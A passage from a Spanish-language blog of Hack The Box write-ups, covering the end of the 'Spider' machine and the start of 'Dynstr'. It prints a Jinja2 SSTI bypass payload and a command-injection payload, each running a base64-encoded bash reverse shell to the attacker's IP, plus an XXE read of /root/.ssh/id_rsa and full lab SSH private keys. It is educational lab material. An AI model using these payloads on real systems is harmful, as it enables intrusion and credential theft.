block.\nExisten varios bypasses en el artículo de SSTI, pero ninguno es totalmente adecuado.\nEstamos forzados a utilizar el formato {% code %} para añadir un bloque de código válido en una plantilla. Pero con este formato, necesitamos añadir otra expresión. Estos bloques son usados principalmente con sentencias if y for de Python. Pero ambas palabras clave están bloqueadas.\nEn el artículo podemos ver el siguiente payload, que es útil porque coincide en parte con la situación que tenemos:\n If the waf blocks “.” and “_”:\n {{request[\u0026#39;application\u0026#39;][\u0026#39;\\x5f\\x5fglobals\\x5f\\x5f\u0026#39;][\u0026#39;\\x5f\\x5fbuiltins\\x5f\\x5f\u0026#39;][\u0026#39;\\x5f\\x5fimport\\x5f\\x5f\u0026#39;](\u0026#39;os\u0026#39;)[\u0026#39;popen\u0026#39;](\u0026#39;id\u0026#39;)[\u0026#39;read\u0026#39;]()}} Existe otro payload para bypassear el filtro de {{ y }}:\n{% if request[\u0026#39;application\u0026#39;][\u0026#39;__globals__\u0026#39;][\u0026#39;__builtins__\u0026#39;][\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;)[\u0026#39;popen\u0026#39;](\u0026#39;whoami\u0026#39;)[\u0026#39;read\u0026#39;]() == \u0026#39;chiv\\n\u0026#39; %} a {% endif %} Finalmente, existe una palabra clave de Python llamada with (que no está bloqueada) que se usa principalmente para abrir archivos (de forma que el archivo se cierra automáticamente al salir del bloque de código). Sin embargo, se puede utilizar también para abrir procesos. La idea entonces es ejecutar el siguiente código de Python (pero en formato Jinja2):\nwith os.popen(\u0026#34;\u0026lt;reverse shell command\u0026gt;\u0026#34;).read() as a:  pass Podemos construir el comando para ejecutar una reverse shell y codificarlo en Base64 para evitar caracteres especiales que puedan ser bloqueados:\n$ echo -n \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.17.44/4444 0\u0026gt;\u0026amp;1\u0026#39; | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx El payload definitivo para explotar el SSTI es el siguiente:\n{% with a = request[\u0026#34;application\u0026#34;][\u0026#34;\\x5f\\x5fglobals\\x5f\\x5f\u0026#34;][\u0026#34;\\x5f\\x5fbuiltins\\x5f\\x5f\u0026#34;][\u0026#34;\\x5f\\x5fimport\\x5f\\x5f\u0026#34;](\u0026#34;os\u0026#34;)[\u0026#34;popen\u0026#34;](\u0026#34;echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash\u0026#34;)[\u0026#34;read\u0026#34;]() %} a {% endwith %} Intrusión en la máquina Y obtenemos acceso a la máquina como usuario chiv mediante nc:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.243. Ncat: Connection from 10.10.10.243:46884. bash: cannot set terminal process group (1622): Inappropriate ioctl for device bash: no job control in this shell chiv@spider:~$ cat user.txt 1682e37de0725754ecdfb8c816c4f80b En este punto, ya tenemos la flag user.txt.\nPodemos obtener una consola más estable por SSH porque tenemos permisos de lectura sobre el archivo id_rsa de chiv:\nchiv@spider:~$ cat .ssh/id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEAmGvQ3kClVX7pOTDIdNTsQ5EzQl+ZLbpRwDgicM4RuWDvDqjV gjWRBF5B75h/aXjIwUnMXA7XimrfoudDzjynegpGDZL2LHLsVnTkYwDq+o/MnkpS U7tVc2i/LtGvrobrzNRFX8taAOQ561iH9xnR2pPGwHSF1/rHQqaikl9t85ESdrp9 MI+JsgXF4qwdo/zrgxGdcOa7zq6zlnwYlY2zPZZjHYxrrwbJiD7H2pQNiegBQgu7 BLRlsGclItrZB+p4w6pi0ak8NcoKVdeOLpQq0i58vXUCGqtp9iRA0UGv3xmHakM2 VTZrVb7Q0g5DGbEXcIW9oowFXD2ufo2WPXym0QIDAQABAoIBAH4cNqStOB6U8sKu 6ixAP3toF9FC56o+DoXL7DMJTQDkgubOKlmhmGrU0hk7Q7Awj2nddYh1f0C3THGs hx2MccU32t5ASg5cx86AyLZhfAn0EIinVZaR2RG0CPrj40ezukWvG/c2eTFjo8hl Z5m7czY2LqvtvRAGHfe3h6sz6fUrPAkwLTl6FCnXL1kCEUIpKaq5wKS1xDHma3Pc XVQU8a7FwiqCiRRI+GqJMY0+uq8/iao20jF+aChGu2cAP78KAyQU4NIsKNnewIrq 54dWOw8lwOXp2ndmo3FdOfjm1SMNYtB5yvPR9enbu3wkX94fC/NS9OqLLMzZfYFy f0EMoUECgYEAxuNi/9sNNJ6UaTlZTsn6Z8X/i4AKVFgUGw4sYzswWPC4oJTDDB62 nKr2o33or9dTVdWki1jI41hJCczx2gRqCGtu0yO3JaCNY5bCA338YymdVkphR9TL j0UOJ1vHU06RFuD28orK+w0b+gVanQIiz/o57xZ1sVNaNOyJUlsenh8CgYEAxDCO JjFKq+0+Byaimo8aGjFiPQFMT2fmOO1+/WokN+mmKLyVdh4W22rVV4v0hn937EPW K1Oc0/hDtSSHSwI/PSN4C2DVyOahrDcPkArfOmBF1ozcR9OBAJME0rnWJm6uB7Lv hm1Ll0gGJZ/oeBPIssqG1srvUNL/+sPfP3x8PQ8CgYEAqsuqwL2EYaOtH4+4OgkJ mQRXp5yVQklBOtq5E55IrphKdNxLg6T8fR30IAKISDlJv3RwkZn1Kgcu8dOl/eu8 gu5/haIuLYnq4ZMdmZIfo6ihDPFjCSScirRqqzINwmS+BD+80hyOo3lmhRcD8cFb 0+62wbMv7s/9r2VRp//IE1ECgYAHf7efPBkXkzzgtxhWAgxEXgjcPhV1n4oMOP+2 nfz+ah7gxbyMxD+paV74NrBFB9BEpp8kDtEaxQ2Jefj15AMYyidHgA8L28zoMT6W CeRYbd+dgMrWr/3pULVJfLLzyx05zBwdrkXKZYVeoMsY8+Ci/NzEjwMwuq/wHNaG rbJt/wKBgQCTNzPkU50s1Ad0J3kmCtYo/iZN62poifJI5hpuWgLpWSEsD05L09yO TTppoBhfUJqKnpa6eCPd+4iltr2JT4rwY4EKG0fjWWrMzWaK7GnW45WFtCBCJIf6 IleM+8qziZ8YcxqeKNdpcTZkl2VleDsZpkFGib0NhKaDN9ugOgpRXw== -----END RSA PRIVATE KEY----- Enumeración del sistema Como usuario chiv, podemos realizar un sencillo escaneo de puertos internos y ver que el puerto 8080 está abierto:\n$ ssh -i id_rsa chiv@10.10.10.243 chiv@spider:~$ for port in $(seq 1 65535); do timeout 1 echo 2\u0026gt;/dev/null \u0026gt; /dev/tcp/127.0.0.1/$port \u0026amp;\u0026amp; echo \u0026#34;Port $port OPEN\u0026#34;; done Port 22 OPEN Port 80 OPEN Port 3306 OPEN Port 8080 OPEN Podemos realizar un reenvío de puertos mediante SSH para hacer accesible el puerto 8080 desde el puerto 8888 de nuestra máquina de atacante (no se ha elegido el 8080 porque Burp Suite escucha en este puerto).\n$ ssh -i id_rsa chiv@10.10.10.243 -L 8888:127.0.0.1:8080 Encontrando un XXE Si se entra ahora a http://localhost:8888, aparecerá una página de inicio de sesión:\nEsta es otra aplicación realizada con Flask (lo sabemos por la misma razón que antes). Esta vez, la cookie de sesión generada contiene la siguiente información:\n$ python3 -m flask_unsign --decode --cookie \u0026#39;.eJxtjjFvgzAYRP9K5bmDSZMFqQsyhprGyB-2Cd6gjgTBdlHKQIjy3xuGbh1P757u7sgt3qH4jl46FCOVcmrTRYqRaajnoH1Un-vjrcvN0Cq6l9mUWBURcYKjJvCp0r6w_mNV1UyePFSKJyWdcrgkZuNbNtgRUVsmcLo3tC-7jM-87gcdqau80MK68WaJFmIdl2Zlzz02Q4D2P7_RfWmcO6kAvV7FVSp4s5420hujI4Yb_YULzKe_viSsajPIYfsX7K7Z4YP1kHKC39HjFU3fQ5h_UIwfv0J0Vqg.YQRD8w.gRIxNZ4auzfGHswxcJjPUpOabEM\u0026#39; {\u0026#39;lxml\u0026#39;: b\u0026#39;PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+N1JvY2t5PC91c2VybmFtZT4KICAgICAgICA8aXNfYWRtaW4+MDwvaXNfYWRtaW4+CiAgICA8L2RhdGE+Cjwvcm9vdD4=\u0026#39;, \u0026#39;points\u0026#39;: 0} $ echo PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+N1JvY2t5PC91c2VybmFtZT4KICAgICAgICA8aXNfYWRtaW4+MDwvaXNfYWRtaW4+CiAgICA8L2RhdGE+Cjwvcm9vdD4= | base64 -d \u0026lt;!-- API Version 1.0.0 --\u0026gt; \u0026lt;root\u0026gt;  \u0026lt;data\u0026gt;  \u0026lt;username\u0026gt;7Rocky\u0026lt;/username\u0026gt;  \u0026lt;is_admin\u0026gt;0\u0026lt;/is_admin\u0026gt;  \u0026lt;/data\u0026gt; \u0026lt;/root\u0026gt; Vemos que contiene un documento XML codificado en Base64 y que incluye el nombre de usuario con el que hemos iniciado la sesión. Esto indica que el vector de ataque es probablemente algún tipo de inyección de Entidad Externa XML (XXE).\nParece que solamente tenemos control sobre el nombre de usuario. Esto es un problema si queremos realizar un ataque XXE, ya que las entidades XML no pueden estar entre etiquetas de datos, deben estar definidas en el primer nivel. Existen algunos payloads que utilizan inyección XPATH, pero no funcionan esta vez.\nUtilizando Burp Suite, podemos ver cómo se realiza la petición al iniciar sesión:\nComo se muestra en la captura, además de username hay un parámetro version que por defecto vale 1.0.0. Podemos utilizar curl para realizar una petición cambiando el número de versión y ver qué ocurre:\n$ curl http://localhost:8888/login -svd \u0026#39;username=7Rocky\u0026amp;version=1.33.7\u0026#39; * Trying 127.0.0.1:8888... * Connected to localhost (127.0.0.1) port 8888 (#0) \u0026gt; POST /login HTTP/1.1 \u0026gt; Host: localhost:8888 \u0026gt; User-Agent: curl/7.79.1 \u0026gt; Accept: */* \u0026gt; Content-Type: application/x-www-form-urlencoded \u0026gt; Content-Length: 30 \u0026gt; * Mark bundle as not supporting multiuse \u0026lt; HTTP/1.1 302 FOUND \u0026lt; Content-Type: text/html; charset=utf-8 \u0026lt; Content-Length: 217 \u0026lt; Location: http://localhost:8888/site \u0026lt; Vary: Cookie \u0026lt; Set-Cookie: session=.eJxtzstqhDAAheFXKVl3YYIDHaGLhvE6GInmgtmNRKoY03QiVB3m3eumu67P-eF7ALPOBkQP8NKBCPCYJDpeGZ0KUcvFihnKXpZbl6nxxpOQpY700_rdIl3y_eNOkQt7mW8Vw1Shs204wQrijM_DVAf82A1WgblQqQsaJJbHg-yNaxsrlNgTz1M3cZRvzBZGZBqpZKi6lCxEDqOA__Xa9-Zzq-dlFGiFR4-r-Ofwubac1L012muBbYf-_uXpBk17eA7fW8gu5KrnfOeNfwfPV-C-Rrt4EAXPX_HQWOc.YXPYog.GJtBaEqASFJ3QxKY08rhwi3v5NQ; HttpOnly; Path=/ \u0026lt; \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 3.2 Final//EN\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Redirecting...\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Redirecting...\u0026lt;/h1\u0026gt; * Connection #0 to host localhost left intact \u0026lt;p\u0026gt;You should be redirected automatically to target URL: \u0026lt;a href=\u0026#34;/site\u0026#34;\u0026gt;/site\u0026lt;/a\u0026gt;. If not click the link. $ python3 -m flask_unsign --decode --cookie \u0026#39;.eJxtzstqhDAAheFXKVl3YYIDHaGLhvE6GInmgtmNRKoY03QiVB3m3eumu67P-eF7ALPOBkQP8NKBCPCYJDpeGZ0KUcvFihnKXpZbl6nxxpOQpY700_rdIl3y_eNOkQt7mW8Vw1Shs204wQrijM_DVAf82A1WgblQqQsaJJbHg-yNaxsrlNgTz1M3cZRvzBZGZBqpZKi6lCxEDqOA__Xa9-Zzq-dlFGiFR4-r-Ofwubac1L012muBbYf-_uXpBk17eA7fW8gu5KrnfOeNfwfPV-C-Rrt4EAXPX_HQWOc.YXPYog.GJtBaEqASFJ3QxKY08rhwi3v5NQ\u0026#39; {\u0026#39;lxml\u0026#39;: b\u0026#39;PCEtLSBBUEkgVmVyc2lvbiAxLjMzLjcgLS0+Cjxyb290PgogICAgPGRhdGE+CiAgICAgICAgPHVzZXJuYW1lPjdSb2NreTwvdXNlcm5hbWU+CiAgICAgICAgPGlzX2FkbWluPjA8L2lzX2FkbWluPgogICAgPC9kYXRhPgo8L3Jvb3Q+\u0026#39;, \u0026#39;points\u0026#39;: 0} $ echo PCEtLSBBUEkgVmVyc2lvbiAxLjMzLjcgLS0+Cjxyb290PgogICAgPGRhdGE+CiAgICAgICAgPHVzZXJuYW1lPjdSb2NreTwvdXNlcm5hbWU+CiAgICAgICAgPGlzX2FkbWluPjA8L2lzX2FkbWluPgogICAgPC9kYXRhPgo8L3Jvb3Q+ | base64 -d \u0026lt;!-- API Version 1.33.7 --\u0026gt; \u0026lt;root\u0026gt;  \u0026lt;data\u0026gt;  \u0026lt;username\u0026gt;7Rocky\u0026lt;/username\u0026gt;  \u0026lt;is_admin\u0026gt;0\u0026lt;/is_admin\u0026gt;  \u0026lt;/data\u0026gt; \u0026lt;/root\u0026gt; Como se puede observar, tenemos control sobre el parámetro version. Esta vez sí que sirve para realizar un ataque XXE, porque podemos escapar del contexto del comentario (\u0026lt;!-- ... --\u0026gt;) e inyectar una entidad externa XML en el primer nivel.\nPodemos mirar en PayloadsAllTheThings y encontrar algún payload que nos sea útil.\nPara explotar la vulnerabilidad de XXE, podemos crear un script en Bash llamado xxe.sh para automatizar el proceso y extraer la información que nos interesa (explicación detallada aquí). La idea es cargar archivos del servidor para leerlos.\nDespués de algunas pruebas, descubrimos que tenemos privilegios de root.\nAcceso a la máquina como root Entonces, podemos leer la clave privada de SSH de root:\n$ bash xxe.sh /root/.ssh/id_rsa | tee root_id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAl/dn2XpJQuIw49CVNdAgdeO5WZ47tZDYZ+7tXD8Q5tfqmyxq gsgQskHffuzjq8v/q4aBfm6lQSn47G8foq0gQ1DvuZkWFAATvTjliXuE7gLcItPt iFtbg7RQV/xaTwAmdRfRLb7x63TG6mZDRkvFvGfihWqAnkuJNqoVJclgIXLuwUvk 4d3/Vo/MdEUb02ha7Rw9oHSYKR4pIgv4mDwxGGL+fwo6hFNCZ+YK96wMlJc3vo5Z EgkdKXy3RnLKvtxjpIlfmAZGu0T+RX1GlmoPDqoDWRbWU+wdbES35vqxH0uM5WUh vPt5ZDGiKID4Tft57udHxPiSD6YBhLT5ooHfFQIDAQABAoIBAFxB9Acg6Vc0kO/N krhfyUUo4j7ZBHDfJbI7aFinZPBwRtq75VHOeexud2vMDxAeQfJ1Lyp9q8/a1mdb sz4EkuCrQ05O9QthXJp0700+8t24WMLAHKW6qN1VW61+46iwc6iEtBZspNwIQjbN rKwBlmMiQnAyzzDKtNu9+Ca/kZ/cAjLpz3m1NW7X//rcDL8kBGs8RfuHqz/R4R7e HtCvxuXOFnyo/I+A3j1dPHoc5UH56g1W82NwTCbtCfMfeUsUOByLcg3yEypClO/M s7pWQ1e4m27/NmU7R/cslc03YFQxow+CIbdd59dBKTZKErdiMd49WiZSxizL7Rdt WBTACsUCgYEAyU9azupb71YnGQVLpdTOzoTD6ReZlbDGeqz4BD5xzbkDj7MOT5Dy R335NRBf7EJC0ODXNVSY+4vEXqMTx9eTxpMtsP6u0WvIYwy9C7K/wCz+WXNV0zc0 kcSQH/Yfkd2jADkMxHXkz9THXCChOfEt7IUmNSM2VBKb1xBMkuLXQbMCgYEAwUBS FhRNrIB3os7qYayE+XrGVdx/KXcKva6zn20YktWYlH2HLfXcFQQdr30cPxxBSriS BAKYcdFXSUQDPJ1/qE21OvDLmJFu4Xs7ZdGG8o5v8JmF6TLTwi0Vi45g38DJagEl w42zV3vV7bsAhQsMvd3igLEoDFt34jO9nQv9KBcCgYEAk8eLVAY7AxFtljKK++ui /Xv9DWnjtz2UFo5Pa14j0O+Wq7C4OrSfBth1Tvz8TcW+ovPLSD0YKODLgOWaKcQZ mVaF3j64OsgyzHOXe7T2iq788NF4GZuXHcL8Qlo9hqj7dbhrpPUeyWrcBsd1U8G3 AsAj8jItOb6HZHN0owefGX0CgYAICQmgu2VjZ9ARp/Lc7tR0nyNCDLII4ldC/dGg LmQYLuNyQSnuwktNYGdvlY8oHJ+mYLhJjGYUTXUIqdhMm+vj7p87fSmqBVoL7BjT Kfwnd761zVxhDuj5KPC9ZcUnaJe3XabZU7oCSDbj9KOX5Ja6ClDRswwMP31jnW0j 64yyLwKBgBkRFxxuGkB9IMmcN19zMWA6akE0/jD6c/51IRx9lyeOmWFPqitNenWK teYjUjFTLgoi8MSTPAVufpdQV4128HuMbMLVpHYOVWKH/noFetpTE2uFStsNrMD8 vEgG/fMJ9XmHVsPePviZBfrnszhP77sgCXX8Grhx9GlVMUdxeo+j -----END RSA PRIVATE KEY----- $ chmod 600 root_id_rsa Y finalmente acceder como root y conseguir la flag root.txt:\n$ ssh -i root_id_rsa root@10.10.10.243 root@spider:~# cat root.txt a50aa50be1beeb8c3d54bc200e40adbe ","image":"/images/HTB/Spider/Spider.png","permalink":"https://7rocky.github.io/htb/spider/","section":"htb","summary":"Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web vulnerable a Server-Site Template Injection (SSTI) en dos puntos e inyección de código SQL (SQLi), y otra página interna vulnerable a inyección de entidades externas XML (XXE). Para comprometer esta máquina se necesitan conocimientos avanzados de SSTI y evasión de filtros, SQLi, XXE y reenvío de puertos. En este write-up se utiliza un script en Python para explotar un SSTI y un script en Bash para leer archivos mediante XXE","time":7,"title":"Spider"},{"contents":"  SO: Linux   Dificultad: Media   Dirección IP: 10.10.10.244   Fecha: 05 / 06 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.10.244 -p 22,53,80 Nmap scan report for 10.10.10.244 Host is up (0.048s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA) | 256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA) |_ 256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519) 53/tcp open domain ISC BIND 9.16.1 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.16.1-Ubuntu 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Dyna DNS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 15.92 seconds  La máquina tiene abiertos los puertos 22 (SSH), 53 (DNS) y 80 (HTTP).\nInformación general Dyna DNS es una empresa que ofrece DNS dinámico a sus clientes. Como sus servicios están aún en pruebas, proporcionan dynadns:sndanyd como credenciales para Basic HTTP Authentication en su API.\nAdemás, dicen en su página web que la API está diseñada para aceptar peticiones similares a la API REST de no-ip.com.\nDe momento, constan de los siguientes dominios:\n dnsalias.htb dynamicdns.htb no-ip.htb  Exploración del DNS El uso de dig puede ser útil para ver información de los dominios anteriores:\n$ dig dnsalias.htb dynamicdns.htb no-ip.htb @10.10.10.244 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.10.6 \u0026lt;\u0026lt;\u0026gt;\u0026gt; dnsalias.htb dynamicdns.htb no-ip.htb @10.10.10.244 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NXDOMAIN, id: 53374 ;; flags: qr rd ra ad; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 512 ;; QUESTION SECTION: ;dnsalias.htb. IN A ;; AUTHORITY SECTION: . 600 IN SOA a.root-servers.net. nstld.verisign-grs.com. 2022071700 1800 900 604800 86400 ;; Query time: 34 msec ;; SERVER: 80.58.61.250#53(80.58.61.250) ;; WHEN: Sun Jul 17 16:43:18 CEST 2022 ;; MSG SIZE rcvd: 116 ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NXDOMAIN, id: 51687 ;; flags: qr rd ra ad; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 512 ;; QUESTION SECTION: ;dynamicdns.htb. IN A ;; AUTHORITY SECTION: . 600 IN SOA a.root-servers.net. nstld.verisign-grs.com. 2022071700 1800 900 604800 86400 ;; Query time: 45 msec ;; SERVER: 80.58.61.250#53(80.58.61.250) ;; WHEN: Sun Jul 17 16:43:18 CEST 2022 ;; MSG SIZE rcvd: 118 ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 26451 ;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1 ;; WARNING: recursion requested but not available ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ;; QUESTION SECTION: ;no-ip.htb. IN A ;; AUTHORITY SECTION: no-ip.htb. 60 IN SOA dns1.dyna.htb. hostmaster.dyna.htb. 2021030303 21600 3600 604800 60 ;; Query time: 38 msec ;; SERVER: 10.10.10.244#53(10.10.10.244) ;; WHEN: Sun Jul 17 16:43:18 CEST 2022 ;; MSG SIZE rcvd: 98  Echando un vistazo a la documentación de la API de no-ip.com, resulta sencillo generar un nuevo subdominio (usando Basic HTTP Authentication):\n$ curl 'http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=asdf.no-ip.htb\u0026myip=10.10.17.44' good 10.10.17.44  Ahora, el subdominio asdf.no-ip.htb debería estar enlazado a la dirección 10.10.17.44:\n$ dig asdf.no-ip.htb @10.10.10.244 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.10.6 \u0026lt;\u0026lt;\u0026gt;\u0026gt; asdf.no-ip.htb @10.10.10.244 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 26185 ;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; WARNING: recursion requested but not available ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ;; QUESTION SECTION: ;asdf.no-ip.htb. IN A ;; ANSWER SECTION: asdf.no-ip.htb. 30 IN A 10.10.17.44 ;; Query time: 43 msec ;; SERVER: 10.10.10.244#53(10.10.10.244) ;; WHEN: Sun Jul 17 16:44:16 CEST 2022 ;; MSG SIZE rcvd: 59  Intrusión en la máquina El truco está en que el nombre del subdominio (asdf en el ejemplo anterior) es el único parámetro que podemos introducir en la máquina. Entonces, podemos intentar inyectar algún comando. Como no podemos ver la respuesta del comando, podemos verificar primero que nos podemos conectar a nuestra máquina:\n$ echo 'curl 10.10.17.44' | base64 Y3VybCAxMC4xMC4xNy40NAo= $ curl 'http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=`echo+Y3VybCAxMC4xMC4xNy40NAo=|base64+-d|bash`.no-ip.htb\u0026myip=10.10.17.44'  Nótese el uso de Base64 para evitar que haya puntos que puedan confundirse con el separador de los subdominios.\n$ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.10.244 - - [] \"GET / HTTP/1.1\" 200 - ::ffff:10.10.10.244 - - [] \"GET / HTTP/1.1\" 200 -  Como puede verse, obtenemos una conexión, por lo que tenemos ejecución remota de comandos (RCE), y por tanto, podemos conseguir una reverse shell:\n$ echo 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ curl 'http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=`echo+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx|base64+-d|bash`.no-ip.htb\u0026myip=10.10.17.44'  Y así obtenemos acceso como usuario www-data:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.244. Ncat: Connection from 10.10.10.244:43290. bash: cannot set terminal process group (794): Inappropriate ioctl for device bash: no job control in this shell www-data@dynstr:/var/www/html/nic$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@dynstr:/var/www/html/nic$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm www-data@dynstr:/var/www/html/nic$ export TERM=xterm www-data@dynstr:/var/www/html/nic$ export SHELL=bash www-data@dynstr:/var/www/html/nic$ stty rows 50 columns 158  Adicionalmente, podemos analizar el código fuente para ver por qué existía RCE:\nwww-data@dynstr:/var/www/html/nic$ ls -l total 4 -rw-r--r-- 1 root root 0 Mar 12 19:41 index.html -rw-r--r-- 1 root root 1110 Mar 13 19:40 update www-data@dynstr:/var/www/html/nic$ cat update  \u0026lt;?php // Check authentication if(!isset($_SERVER['PHP_AUTH_USER']) ||!isset($_SERVER['PHP_AUTH_PW'])) { echo\"badauth\\n\"; exit; } if($_SERVER['PHP_AUTH_USER'].\":\".$_SERVER['PHP_AUTH_PW']!=='dynadns:sndanyd') { echo\"badauth\\n\"; exit; } // Set $myip from GET, defaulting to REMOTE_ADDR $myip =$_SERVER['REMOTE_ADDR']; if($valid=filter_var($_GET['myip'],FILTER_VALIDATE_IP)) { $myip =$valid; } if(isset($_GET['hostname'])) { // Check for a valid domain list($h,$d) =explode(\".\",$_GET['hostname'],2); $validds =array('dnsalias.htb','dynamicdns.htb','no-ip.htb'); if(!in_array($d,$validds)) { echo\"911 [wrngdom: $d]\\n\"; exit; } // Update DNS entry $cmd =sprintf(\"server 127.0.0.1\\nzone %s\\nupdate delete %s.%s\\nupdate add %s.%s 30 IN A %s\\nsend\\n\",$d,$h,$d,$h,$d,$myip);  system('echo \"'.$cmd.'\" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key',$retval); // Return good or 911 if(!$retval) { echo\"good $myip\\n\"; } else{ echo\"911 [nsupdate failed]\\n\"; exit; } } else{ echo\"nochg $myip\\n\"; } ?\u0026gt;  Se está permitiendo que el usuario introduzca datos (variables $cmd, $h) en un comando de system() sin ninguna validación, por lo que los comandos inyectados se ejecutan.\nEnumeración del sistema Existen tres usuarios relevantes a considerar:\nwww-data@dynstr:/var/www/html/nic$ grep sh$ /etc/passwd root:x:0:0:root:/root:/bin/bash dyna:x:1000:1000:dyna,,,:/home/dyna:/bin/bash bindmgr:x:1001:1001::/home/bindmgr:/bin/bash  Podemos listar los contenidos del directorio /home/bindmgr:\nwww-data@dynstr:/tmp$ ls -la /home/bindmgr/ total 36 drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 . drwxr-xr-x 4 root root 4096 Mar 15 20:26 .. lrwxrwxrwx 1 bindmgr bindmgr 9 Mar 15 20:29 .bash_history - /dev/null -rw-r--r-- 1 bindmgr bindmgr 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 bindmgr bindmgr 3771 Feb 25 2020 .bashrc drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache -rw-r--r-- 1 bindmgr bindmgr 807 Feb 25 2020 .profile drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521 -r-------- 1 bindmgr bindmgr 33 Jun 19 01:58 user.txt www-data@dynstr:/tmp$ ls -la /home/bindmgr/.ssh/ total 24 drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 . drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 .. -rw-r--r-- 1 bindmgr bindmgr 419 Mar 13 12:00 authorized_keys -rw------- 1 bindmgr bindmgr 1823 Mar 13 11:48 id_rsa -rw-r--r-- 1 bindmgr bindmgr 395 Mar 13 11:48 id_rsa.pub -rw-r--r-- 1 bindmgr bindmgr 444 Mar 13 12:09 known_hosts www-data@dynstr:/tmp$ cat /home/bindmgr/.ssh/authorized_keys from=\"*.infra.dyna.htb\" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen  Este usuario bindmgr tiene un archivo authorized_keys. Sin embargo, para conectarnos por SSH sin proporcionar contraseña necesitamos tener una clave privada y tener 